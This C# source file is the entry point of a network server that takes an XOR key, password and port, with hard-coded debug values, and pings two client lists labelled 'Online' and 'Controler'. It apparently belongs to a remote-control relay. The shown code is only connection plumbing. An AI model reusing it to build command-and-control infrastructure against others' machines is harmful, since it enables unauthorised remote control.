using System;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using MessagePack;

namespace Server
{
    class Program
    {
        public static System.Timers.Timer tim = new System.Timers.Timer(1000);
        static async Task Main(string[] args)
        {
#if DEBUG
            Settings.XorKey = "qwqdanchun";
            Settings.Password = "qwqdanchun";
            Settings.Port = 8848;
#else
            Settings.XorKey = args[1];
            Settings.Password = args[2];
            Settings.Port = Convert.ToInt32(args[0]);
#endif
            Listener listener = new Listener();
            await Task.Run(() => listener.Connect());
            tim.Elapsed += Tim_Elapsed;
            tim.Start();
            while (true)
            {
                Thread.Sleep(1000);
            }
        }

        private static void Tim_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (Settings.Online.Count > 0)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "Ping";
                foreach (Clients CL in Settings.Online.ToList())
                {
                    if (Helper.DiffSeconds(CL.LastPing, DateTime.Now) > 20)
                    {
                        CL.Disconnected();
                    }
                    else
                    {
                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                    }                    
                }
            }
            if (Settings.Controler.Count > 0)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "Ping";
                foreach (Clients CL in Settings.Controler.ToList())
                {
                    if (Helper.DiffSeconds(CL.LastPing, DateTime.Now) > 20)
                    {
                        CL.Disconnected();
                    }
                    else
                    {
                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                    }                    
                }
            }
        }
    }
}
